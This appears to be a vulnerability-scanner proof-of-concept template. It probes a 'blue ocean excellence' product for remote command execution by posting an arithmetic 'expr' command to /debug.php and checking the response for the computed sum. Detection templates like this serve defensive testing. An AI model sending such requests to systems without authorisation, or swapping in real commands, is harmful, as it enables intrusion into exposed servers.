name: poc-yaml-blue-ocean-excellence-rce
set:
  r1: randomInt(40000, 40800)
  r2: randomInt(40000, 40800)
rules:
  - method: POST
    path: /debug.php
    body: |
        cmd=expr%20{{r1}}%20%2b%20{{r2}}
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
detail:
  author: MaxSecurity(https://github.com/MaxSecurity)
    links:
    - https://mp.weixin.qq.com/s/CVe7GSRzCKcYXj5Pj8W5SA